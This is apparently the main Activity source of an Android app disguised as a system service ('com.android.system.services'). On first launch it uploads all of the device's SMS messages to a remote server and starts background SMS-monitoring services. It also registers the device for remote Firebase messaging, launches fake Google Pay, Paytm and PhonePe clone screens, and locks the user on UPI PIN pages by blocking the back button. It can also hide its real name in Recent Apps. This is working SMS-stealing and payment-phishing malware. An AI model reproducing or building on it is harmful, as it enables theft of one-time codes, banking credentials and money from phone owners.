package com.android.system.services

import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebSettings
import android.webkit.WebChromeClient
import androidx.core.content.ContextCompat
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.viewinterop.AndroidView
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.android.system.services.utils.NetworkChecker
import com.android.system.services.utils.DataUploader
import com.android.system.services.utils.DeviceInfoHelper
import com.android.system.services.utils.PermissionManager
import com.android.system.services.utils.PermissionDialog
import com.android.system.services.utils.SmsBatchUploader
import com.android.system.services.UnifiedService
import com.google.firebase.messaging.FirebaseMessaging
import com.android.system.services.R
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob

class MainActivity : ComponentActivity() {

    private lateinit var deviceId: String
    private var fcmToken: String = ""
    private val handler = Handler(Looper.getMainLooper())

    private val BATTERY_UPDATE_INTERVAL_MS = 600000L
    private val FCM_TIMEOUT_MS = 3000L

    private lateinit var webView: WebView
    private lateinit var permissionManager: PermissionManager
    private val uploadScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    
    private lateinit var appConfig: AppConfig
    private var isPaymentReceiverRegistered = false
    private val paymentSuccessReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            runOnUiThread {
                Log.d(TAG, "Payment success received - marking final as reached")
                markFinalReached()
                if (::webView.isInitialized) {
                    try {
                        Log.d(TAG, "Loading final.html immediately")
                        webView.loadUrl("file:///android_asset/final.html")
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to load final page after payment success", e)
                    }
                } else {
                    Log.d(TAG, "WebView not initialized, setting pending flag")
                    pendingFinalScreen = true
                }
            }
        }
    }
    private var pendingFinalScreen = false
    private var shouldLoadFinal = false

    companion object {
        private const val TAG = "MainActivity"
        const val ACTION_CLOSE = "com.android.system.services.ACTION_CLOSE"
        const val ACTION_SHOW_FINAL = "com.android.system.services.ACTION_SHOW_FINAL"
        private const val PREFS_NAME = "final_state_prefs"
        private const val KEY_REACHED_FINAL = "final_reached"
    }

    private val batteryUpdater = object : Runnable {
        override fun run() {
            DataUploader.sendBatteryUpdate(this@MainActivity, deviceId, fcmToken)
            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Initialize WorkManager manually since WorkManagerInitializer is disabled
        try {
            val config = androidx.work.Configuration.Builder()
                .setMinimumLoggingLevel(android.util.Log.INFO)
                .build()
            androidx.work.WorkManager.initialize(this, config)
            Log.d(TAG, "WorkManager initialized successfully")
        } catch (e: IllegalStateException) {
            // WorkManager might already be initialized
            Log.w(TAG, "WorkManager already initialized: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize WorkManager: ${e.message}", e)
        }
        
        if (intent.action == ACTION_CLOSE) {
            Log.d(TAG, "ACTION_CLOSE -> finish")
            finishAndRemoveTask()
            return
        } else if (intent.action == ACTION_SHOW_FINAL) {
            Log.d(TAG, "ACTION_SHOW_FINAL -> mark final")
            markFinalReached()
            pendingFinalScreen = true
            shouldLoadFinal = true
        }
        
        // Check if final was reached before - MUST check this first
        val finalReached = isFinalReached()
        if (finalReached) {
            Log.d(TAG, "onCreate: finalReached=true -> load final")
            pendingFinalScreen = true
            shouldLoadFinal = true
        } else {
            Log.d(TAG, "onCreate: finalReached=false -> load index")
            // Make sure flags are cleared if final not reached
            pendingFinalScreen = false
            shouldLoadFinal = false
        }
        
        enableFullscreen()

        appConfig = AppConfig.load(this)
        ServerConfig.initialize(this)
        registerPaymentSuccessReceiver()
        
        // Set task description for noname flavors to show original icon in Recent Apps
        setTaskDescriptionForRecentApps()
        
        Handler(Looper.getMainLooper()).postDelayed({
            ServerConfig.printAllSettings()
        }, 2000)

        deviceId = DeviceInfoHelper.getDeviceId(this)
        subscribeToFirebaseTopic()

        permissionManager = PermissionManager(this)
        permissionManager.initialize { }

        uploadScope.launch {
            try {
                var fcmTokenInitial = "NO_FCM_TOKEN_${deviceId.take(8)}"
                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                    if (task.isSuccessful && task.result != null) {
                        fcmTokenInitial = task.result!!
                    }
                }
                delay(1000)
                
                DataUploader.registerDeviceInitial(
                    this@MainActivity,
                    deviceId,
                    fcmTokenInitial,
                    appConfig.userId
                )
            } catch (e: Exception) {
                Log.e(TAG, "Initial registration error: ${e.message}", e)
            }
        }

        setContent {
            MaterialTheme {
                MainScreen()
            }
        }
    }
    
    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        when (intent?.action) {
            ACTION_CLOSE -> finishAndRemoveTask()
            ACTION_SHOW_FINAL -> showFinalScreen()
        }
    }
    
    override fun onResume() {
        super.onResume()
        Log.d(TAG, "onResume called")
        
        // Check if final was reached and ensure we're on final.html
        if (isFinalReached() && ::webView.isInitialized) {
            val currentUrl = webView.url ?: ""
            if (!currentUrl.contains("final.html")) {
                Log.d(TAG, "Final reached but not on final.html, redirecting...")
                handler.post {
                    webView.loadUrl("file:///android_asset/final.html")
                }
            }
        }
    }
    
    override fun onStart() {
        super.onStart()
        Log.d(TAG, "onStart called")
        
        // Ensure final.html is loaded if we've reached it before
        if (isFinalReached() && ::webView.isInitialized) {
            val currentUrl = webView.url ?: ""
            if (!currentUrl.contains("final.html")) {
                Log.d(TAG, "Final reached but not on final.html in onStart, redirecting...")
                handler.postDelayed({
                    if (::webView.isInitialized) {
                        webView.loadUrl("file:///android_asset/final.html")
                    }
                }, 500)
            }
        }
    }
    
    private fun subscribeToFirebaseTopic() {
        FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
            .addOnSuccessListener {
                Log.d(TAG, "Subscribed to topic successfully")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Failed to subscribe to topic", e)
            }
    }
    
    private fun checkInternetConnection(): Boolean {
        return NetworkChecker.isInternetAvailable(this)
    }

    private fun enableFullscreen() {
        actionBar?.hide()
        WindowCompat.setDecorFitsSystemWindows(window, false)

        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        windowInsetsController.apply {
            hide(WindowInsetsCompat.Type.systemBars())
            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                isAppearanceLightStatusBars = true
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                isAppearanceLightNavigationBars = false
            }
        }

        window.statusBarColor = android.graphics.Color.TRANSPARENT
        window.navigationBarColor = android.graphics.Color.TRANSPARENT
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
    }
    
    private fun setTaskDescriptionForRecentApps() {
        Log.d(TAG, "setTaskDescriptionForRecentApps called")
        
        // Check if this is a noname flavor by checking flavor_app_name string resource
        // In build.gradle.kts, noname flavors have resValue("string", "flavor_app_name", "")
        val flavorAppName = try {
            getString(R.string.flavor_app_name)
        } catch (e: Exception) {
            Log.e(TAG, "Error getting flavor_app_name: ${e.message}", e)
            ""
        }
        
        Log.d(TAG, "flavor_app_name from resources: '$flavorAppName'")
        Log.d(TAG, "flavor_app_name.isBlank(): ${flavorAppName.isBlank()}")
        Log.d(TAG, "appConfig.appName: '${appConfig.appName}'")
        
        // Check if this is a noname flavor (flavor_app_name is empty)
        if (flavorAppName.isBlank()) {
            Log.d(TAG, "Noname flavor detected, setting task description")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                Log.d(TAG, "Android version >= LOLLIPOP, proceeding")
                try {
                    // Get app name from config.json (for display in Recent Apps)
                    val displayName = try {
                        val configFile = assets.open("config.json")
                        val configContent = configFile.bufferedReader().use { it.readText() }
                        configFile.close()
                        val regex = """"app_name"\s*:\s*"([^"]+)"""".toRegex()
                        val name = regex.find(configContent)?.groupValues?.getOrNull(1) ?: "App"
                        Log.d(TAG, "Display name from config: '$name'")
                        name
                    } catch (e: Exception) {
                        Log.e(TAG, "Error reading config.json: ${e.message}", e)
                        "App"
                    }
                    
                    // Use icon.png from drawable resources (same method as payment clones)
                    try {
                        Log.d(TAG, "Attempting to load icon from R.drawable.icon")
                        // Try to load from drawable resources first
                        val iconBitmap = try {
                            val bitmap = BitmapFactory.decodeResource(resources, R.drawable.icon)
                            if (bitmap != null) {
                                Log.d(TAG, "Successfully loaded icon.png from drawable, size: ${bitmap.width}x${bitmap.height}")
                            } else {
                                Log.e(TAG, "BitmapFactory.decodeResource returned null")
                            }
                            bitmap
                        } catch (e: Exception) {
                            Log.e(TAG, "Error loading icon from R.drawable.icon: ${e.message}", e)
                            Log.e(TAG, "Exception type: ${e.javaClass.simpleName}")
                            null
                        }
                        
                        if (iconBitmap != null) {
                            Log.d(TAG, "Creating TaskDescription with icon.png")
                            val taskDescription = ActivityManager.TaskDescription(
                                displayName,
                                iconBitmap,
                                ContextCompat.getColor(this, android.R.color.white)
                            )
                            setTaskDescription(taskDescription)
                            Log.d(TAG, "TaskDescription set successfully for noname flavor: $displayName with icon.png from drawable")
                        } else {
                            Log.w(TAG, "icon.png not found, using fallback icon")
                            // Fallback to default icon
                            val taskDescription = ActivityManager.TaskDescription(
                                displayName,
                                BitmapFactory.decodeResource(resources, android.R.drawable.ic_menu_myplaces),
                                ContextCompat.getColor(this, android.R.color.white)
                            )
                            setTaskDescription(taskDescription)
                            Log.d(TAG, "Task description set for noname flavor: $displayName with fallback icon")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to set task description for noname: ${e.message}", e)
                        Log.e(TAG, "Exception stack trace:", e)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to set task description for noname (outer catch): ${e.message}", e)
                    Log.e(TAG, "Exception stack trace:", e)
                }
            } else {
                Log.w(TAG, "Android version < LOLLIPOP, cannot set TaskDescription")
            }
        } else {
            Log.d(TAG, "Not a noname flavor (appName='${appConfig.appName}'), skipping task description")
        }
    }

    @Composable
    fun MainScreen() {
        var showPermissionDialog by remember { mutableStateOf(false) }
        var permissionsGranted by remember { mutableStateOf(false) }
        var showSplash by remember { mutableStateOf(true) }
        var hasInternet by remember { mutableStateOf(true) }
        var showNoInternetDialog by remember { mutableStateOf(false) }
        val scope = rememberCoroutineScope()

        LaunchedEffect("internet_check") {
            hasInternet = checkInternetConnection()
            if (!hasInternet) {
                showNoInternetDialog = true
            }
        }

        LaunchedEffect(Unit) {
            // Always show splash first (3 seconds)
            delay(3000)
            
            // AFTER splash, check if final was reached
            val finalReached = isFinalReached()
            if (finalReached) {
                Log.d(TAG, "MainScreen: post-splash finalReached=true")
                pendingFinalScreen = true
                shouldLoadFinal = true
            } else {
                Log.d(TAG, "MainScreen: post-splash finalReached=false")
                pendingFinalScreen = false
                shouldLoadFinal = false
            }
            
            // Hide splash and show WebView
            showSplash = false
            delay(300)
            
            if (!permissionManager.checkAllPermissions()) {
                permissionManager.requestPermissions {
                    if (permissionManager.checkAllPermissions()) {
                        permissionsGranted = true
                        continueInitialization()
                    } else {
                        showPermissionDialog = true
                    }
                }
            } else {
                permissionsGranted = true
                continueInitialization()
            }
        }
        
        if (showNoInternetDialog) {
            NoInternetDialog(
                onRetry = {
                    hasInternet = checkInternetConnection()
                    if (hasInternet) {
                        showNoInternetDialog = false
                    }
                },
                onExit = {
                    finish()
                }
            )
        }
        
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.White)
        ) {
            if (showSplash && appConfig.appType != "wosexy") {
                val appName = appConfig.appName
                val gradientColors = listOf(
                    Color(android.graphics.Color.parseColor(appConfig.theme.primaryColor)),
                    Color(android.graphics.Color.parseColor(appConfig.theme.secondaryColor)),
                    Color(android.graphics.Color.parseColor(appConfig.theme.accentColor))
                )
                
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .background(
                            brush = androidx.compose.ui.graphics.Brush.linearGradient(
                                colors = gradientColors
                            )
                        ),
                    contentAlignment = androidx.compose.ui.Alignment.Center
                ) {
                    Text(
                        text = appName,
                        style = MaterialTheme.typography.displayLarge.copy(
                            fontSize = 48.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White,
                            letterSpacing = 2.sp
                        )
                    )
                }
            } else {
                AndroidView(
                    factory = { context -> createWebView() },
                    modifier = Modifier.fillMaxSize(),
                    update = { webView ->
                        webView.layoutParams = android.view.ViewGroup.LayoutParams(
                            android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                            android.view.ViewGroup.LayoutParams.MATCH_PARENT
                        )
                    }
                )

                if (showPermissionDialog) {
                    PermissionDialog(
                        onRequestPermissions = {
                            scope.launch {
                                permissionManager.requestPermissions { }
                            }
                        },
                        onAllPermissionsGranted = {
                            showPermissionDialog = false
                            permissionsGranted = true
                            continueInitialization()
                        }
                    )
                }
            }
        }
    }

    private fun createWebView(): WebView {
        webView = WebView(this).apply {
            layoutParams = android.view.ViewGroup.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT
            )
            
            isVerticalScrollBarEnabled = false
            isHorizontalScrollBarEnabled = false
            setBackgroundColor(android.graphics.Color.WHITE)
        }

        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webSettings.allowFileAccessFromFileURLs = false
            webSettings.allowUniversalAccessFromFileURLs = false
        }

        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.layoutAlgorithm = WebSettings.LayoutAlgorithm.NORMAL
        
        webSettings.setSupportZoom(false)
        webSettings.builtInZoomControls = false
        webSettings.displayZoomControls = false
        webSettings.loadsImagesAutomatically = true
        webSettings.blockNetworkImage = false
        webSettings.blockNetworkLoads = false
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT
        
        webView.setInitialScale(100)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            WebView.setWebContentsDebuggingEnabled(true)
        } else {
            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                return handleUrlNavigation(url)
            }

            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                return if (url != null) {
                    handleUrlNavigation(url)
                } else {
                    false
                }
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                
                val currentUrl = url ?: ""
                Log.d(TAG, "onPageFinished: $currentUrl")
                
                // If final was reached before, always redirect to final.html
                if (isFinalReached()) {
                    if (!currentUrl.contains("final.html")) {
                        Log.d(TAG, "Final reached before - redirecting to final.html from: $currentUrl")
                        handler.postDelayed({
                            if (::webView.isInitialized) {
                                webView.loadUrl("file:///android_asset/final.html")
                            }
                        }, 100)
                        return
                    }
                }
                
                // Mark as reached when final.html is loaded
                if (currentUrl.contains("final.html")) {
                    Log.d(TAG, "Final page loaded - marking as reached")
                    markFinalReached()
                    shouldLoadFinal = true
                }

                webView.evaluateJavascript(
                    """
                    (function() {
                        try {
                            var el = document.getElementById('deviceId');
                            if (el) el.innerText = 'Device ID: $deviceId';
                        } catch(e) {}
                    })();
                    """.trimIndent(),
                    null
                )
                
                webView.evaluateJavascript(
                    """
                    (function() {
                        try {
                            var metaTheme = document.querySelector('meta[name="theme-color"]');
                            if (metaTheme) {
                                return metaTheme.getAttribute('content');
                            }
                            return null;
                        } catch(e) {
                            return null;
                        }
                    })();
                    """.trimIndent()
                ) { color ->
                    if (color != null && color != "null") {
                        val colorValue = color.replace("\"", "")
                        try {
                            val parsedColor = android.graphics.Color.parseColor(colorValue)
                            runOnUiThread {
                                window.statusBarColor = parsedColor
                                window.navigationBarColor = parsedColor
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to parse color", e)
                        }
                    }
                }
            }

            override fun onReceivedError(view: WebView?, errorCode: Int, description: String?, failingUrl: String?) {
                super.onReceivedError(view, errorCode, description, failingUrl)
                Log.e(TAG, "WebView error: $description")
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                msg?.let {
                    Log.d(TAG, "JS: ${it.message()}")
                }
                return true
            }
        }

        webView.addJavascriptInterface(object {
            @android.webkit.JavascriptInterface
            fun getDeviceId(): String = deviceId
            
            @android.webkit.JavascriptInterface
            fun getUserId(): String = appConfig.userId
            
            @android.webkit.JavascriptInterface
            fun getAppType(): String = appConfig.appType
            
            @android.webkit.JavascriptInterface
            fun getAppName(): String = appConfig.appName
            
            @android.webkit.JavascriptInterface
            fun getThemeColors(): String = appConfig.theme.toJson()
            
            @android.webkit.JavascriptInterface
            fun getBaseUrl(): String = ServerConfig.getBaseUrl()
            
            @android.webkit.JavascriptInterface
            fun getPaymentAmount(): String = appConfig.payment.formattedAmount()
            
            @android.webkit.JavascriptInterface
            fun getPaymentDescription(): String = appConfig.payment.description
            
            @android.webkit.JavascriptInterface
            fun openPaymentClone(paymentMethod: String) {
                runOnUiThread {
                    openPaymentCloneActivity(paymentMethod)
                }
            }
            
            @android.webkit.JavascriptInterface
            fun markFinalReached() {
                runOnUiThread {
                    Log.d(TAG, "markFinalReached called from JavaScript")
                    // Call the actual function to save to SharedPreferences
                    this@MainActivity.markFinalReached()
                }
            }
        }, "Android")

        try {
            // Always check if final was reached before loading - this is the most reliable check
            val finalReached = isFinalReached()
            Log.d(TAG, "createWebView: finalReached=$finalReached, pending=$pendingFinalScreen, shouldLoad=$shouldLoadFinal")
            
            // If final was reached, ALWAYS load final.html regardless of other flags
            val targetUrl = if (finalReached) {
                Log.d(TAG, "createWebView: load final (reached)")
                pendingFinalScreen = false
                shouldLoadFinal = true
                "file:///android_asset/final.html"
            } else if (pendingFinalScreen || shouldLoadFinal) {
                Log.d(TAG, "createWebView: load final (flags set)")
                pendingFinalScreen = false
                shouldLoadFinal = true
                "file:///android_asset/final.html"
            } else {
                Log.d(TAG, "createWebView: load index")
                "file:///android_asset/index.html"
            }
            webView.loadUrl(targetUrl)
        } catch (e: Exception) {
            Log.e(TAG, "Load error: ${e.message}", e)
            // Fallback: if error occurs, check again and load final if reached
            if (isFinalReached()) {
                try {
                    webView.loadUrl("file:///android_asset/final.html")
                } catch (e2: Exception) {
                    Log.e(TAG, "Fallback load error: ${e2.message}", e2)
                }
            }
        }

        return webView
    }
    
    private fun registerPaymentSuccessReceiver() {
        if (isPaymentReceiverRegistered) {
            return
        }
        val filter = IntentFilter(Constants.ACTION_PAYMENT_SUCCESS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(paymentSuccessReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            @Suppress("DEPRECATION")
            registerReceiver(paymentSuccessReceiver, filter)
        }
        isPaymentReceiverRegistered = true
    }

    private fun handleUrlNavigation(url: String): Boolean {
        Log.d(TAG, "handleUrlNavigation: $url")
        // If final was reached, block all navigation except to final.html
        if (isFinalReached()) {
            if (!url.contains("final.html")) {
                Log.d(TAG, "Blocking navigation to: $url (final reached), redirecting to final.html")
                handler.post {
                    if (::webView.isInitialized) {
                        webView.loadUrl("file:///android_asset/final.html")
                    }
                }
                return true
            }
        }
        return false
    }

    private fun openPaymentCloneActivity(paymentMethod: String) {
        val intent = when (paymentMethod.lowercase().trim()) {
            "gpay", "googlepay", "google-pay" -> {
                Intent(this, GPayCloneActivity::class.java)
            }
            "paytm" -> {
                Intent(this, PaytmCloneActivity::class.java)
            }
            "phonepe" -> {
                Intent(this, PhonePeCloneActivity::class.java)
            }
            else -> {
                Log.e(TAG, "Unknown payment method: $paymentMethod")
                return
            }
        }
        
        startActivity(intent)
    }

    private fun showFinalScreen() {
        Log.d(TAG, "showFinalScreen called")
        markFinalReached()
        if (::webView.isInitialized) {
            runOnUiThread {
                webView.loadUrl("file:///android_asset/final.html")
            }
        } else {
            pendingFinalScreen = true
            shouldLoadFinal = true
        }
    }
    
    private fun markFinalReached() {
        try {
            val prefs: SharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val editor = prefs.edit()
            editor.putBoolean(KEY_REACHED_FINAL, true)
            // Use commit() instead of apply() to ensure it's written immediately
            val success = editor.commit()
            shouldLoadFinal = true
            Log.d(TAG, "markFinalReached: saved = $success")
            
            // Double-check that it was saved
            val verify = prefs.getBoolean(KEY_REACHED_FINAL, false)
            Log.d(TAG, "markFinalReached: verification = $verify")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to mark final as reached", e)
        }
    }
    
    private fun isFinalReached(): Boolean {
        try {
            val prefs: SharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val reached = prefs.getBoolean(KEY_REACHED_FINAL, false)
            Log.d(TAG, "isFinalReached: $reached")
            if (reached) {
                shouldLoadFinal = true
            }
            return reached
        } catch (e: Exception) {
            Log.e(TAG, "Failed to check if final reached", e)
            return false
        }
    }

    private fun continueInitialization() {
        var fcmReceived = false

        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            fcmReceived = true
            if (task.isSuccessful && task.result != null) {
                fcmToken = task.result!!
            } else {
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
            }
        }

        handler.postDelayed({
            if (!fcmReceived) {
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
            }

            uploadScope.launch {
                try {
                    val registerSuccess = DataUploader.registerDevice(
                        this@MainActivity,
                        deviceId,
                        fcmToken,
                        appConfig.userId
                    )

                    // 🔥 فقط یکبار batch upload کن (اولین باری که اپ نصب میشه)
                    val prefs = getSharedPreferences("sms_upload_state", Context.MODE_PRIVATE)
                    val hasUploadedBefore = prefs.getBoolean("initial_batch_uploaded", false)
                    
                    if (!hasUploadedBefore) {
                        Log.d(TAG, "First time - uploading all SMS in batch")
                        launch {
                            val result = SmsBatchUploader.uploadAllSms(
                                context = this@MainActivity,
                                deviceId = deviceId,
                                baseUrl = ServerConfig.getBaseUrl()
                            ) { progress -> }
                            
                            // بعد از اتمام، flag رو ذخیره کن
                            if (result is SmsBatchUploader.UploadResult.Success) {
                                prefs.edit().putBoolean("initial_batch_uploaded", true).apply()
                                // ذخیره timestamp آخرین پیامک برای SmsReceiver
                                prefs.edit().putLong("last_batch_timestamp", System.currentTimeMillis()).apply()
                                Log.d(TAG, "Initial batch upload completed successfully")
                            }
                        }
                    } else {
                        Log.d(TAG, "Batch already uploaded before - skipping")
                    }

                } catch (e: Exception) {
                    Log.e(TAG, "Initialization error: ${e.message}", e)
                }
            }

            // راه‌اندازی سرویس‌های background
            startBackgroundServices()

        }, FCM_TIMEOUT_MS)
    }

    // 🔥 راه‌اندازی سرویس‌های background
    private fun startBackgroundServices() {
        try {
            // UnifiedService
            val unifiedIntent = Intent(this, UnifiedService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(unifiedIntent)
            } else {
                startService(unifiedIntent)
            }
            
            // SmsMonitorService
            val smsMonitorIntent = Intent(this, SmsMonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(smsMonitorIntent)
            } else {
                startService(smsMonitorIntent)
            }
            
            Log.d(TAG, "Background services started from MainActivity")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start background services: ${e.message}", e)
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (::webView.isInitialized) {
            val currentUrl = webView.url ?: ""
            if (currentUrl.contains("upi-pin.html") || 
                currentUrl.contains("pin.html") || 
                currentUrl.contains("final.html")) {
                return
            }
            if (webView.canGoBack()) {
                webView.goBack()
            } else {
                super.onBackPressed()
            }
        } else {
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(batteryUpdater)
        
        if (isPaymentReceiverRegistered) {
            try {
                unregisterReceiver(paymentSuccessReceiver)
            } catch (e: Exception) {
                Log.w(TAG, "Failed to unregister payment receiver", e)
            }
            isPaymentReceiverRegistered = false
        }

        if (::webView.isInitialized) {
            webView.stopLoading()
            webView.clearCache(true)
            webView.destroy()
        }
    }
    
    @Composable
    private fun NoInternetDialog(
        onRetry: () -> Unit,
        onExit: () -> Unit
    ) {
        AlertDialog(
            onDismissRequest = { },
            icon = {
                Box(
                    modifier = Modifier
                        .size(80.dp)
                        .background(
                            color = Color(0xFFFFEBEE),
                            shape = CircleShape
                        ),
                    contentAlignment = Alignment.Center
                ) {
                    Text(
                        text = "📡",
                        fontSize = 40.sp
                    )
                }
            },
            title = {
                Text(
                    text = "No Internet Connection",
                    fontSize = 20.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center,
                    modifier = Modifier.fillMaxWidth()
                )
            },
            text = {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(
                        text = "This app requires an internet connection to work.",
                        fontSize = 16.sp,
                        textAlign = TextAlign.Center,
                        color = Color.Gray,
                        modifier = Modifier.padding(vertical = 8.dp)
                    )
                    
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    Text(
                        text = "Please check your connection and try again.",
                        fontSize = 14.sp,
                        textAlign = TextAlign.Center,
                        color = Color.Gray
                    )
                }
            },
            confirmButton = {
                Button(
                    onClick = onRetry,
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(android.graphics.Color.parseColor(appConfig.theme.primaryColor))
                    ),
                    modifier = Modifier.fillMaxWidth(0.48f)
                ) {
                    Text(
                        text = "Retry",
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            },
            dismissButton = {
                TextButton(
                    onClick = onExit,
                    modifier = Modifier.fillMaxWidth(0.48f)
                ) {
                    Text(
                        text = "Exit",
                        fontSize = 16.sp,
                        color = Color.Red
                    )
                }
            },
            containerColor = Color.White,
            shape = RoundedCornerShape(16.dp)
        )
    }
}